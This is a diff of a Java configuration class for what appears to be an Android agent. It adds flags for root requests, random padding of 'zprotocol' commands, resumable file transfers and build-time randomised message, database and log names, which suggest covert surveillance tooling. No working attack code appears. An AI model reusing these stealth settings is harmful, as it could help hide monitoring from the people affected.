@@ -20,15 +20,18 @@ public class Cfg {
 	
 	public static final boolean FILE = @FILE@;
 	public static final boolean MICFILE = false;
-	public static final boolean TRACE = false;
-	public static final boolean DEBUGKEYS = false;
-	public static final boolean PROTOCOL_RANDBLOCK = true;
-	public static final boolean PROTOCOL_RESUME = true;
-	public static final boolean PROTOCOL_KEEPALIVE = true;
-	public static final boolean STATISTICS = @DEBUG@;
+	public static final boolean TRACE = false; // enable Debug.startMethodTracing
+	public static final boolean DEBUGKEYS = false; //uses fake keys if assets/r.bin not available
+	public static final boolean STATISTICS = false; // enable statistics on crypto and on commands
 	
-	public static final String RANDOM = "@RANDOM@";
+	public static final boolean PROTOCOL_RANDBLOCK = true; // increses randomly zprotocol commands
+	public static final boolean PROTOCOL_RESUME = true; // enables zprotocol resume for big files
+	public static final int PROTOCOL_CHUNK = 65536; // chunk size fot resume
 	
+	public static final boolean USE_SD = true; // try to use sd if available
+	public static final boolean FORCE_ROOT = false; // force root request
+	
+	public static final String RANDOM = "@RANDOM@";	
 	public static final String RNDMSG = "@RNDMSG@";
 	public static final String RNDDB = "@RNDDB@";
 	public static final String RNDLOG = "@RNDLOG@";
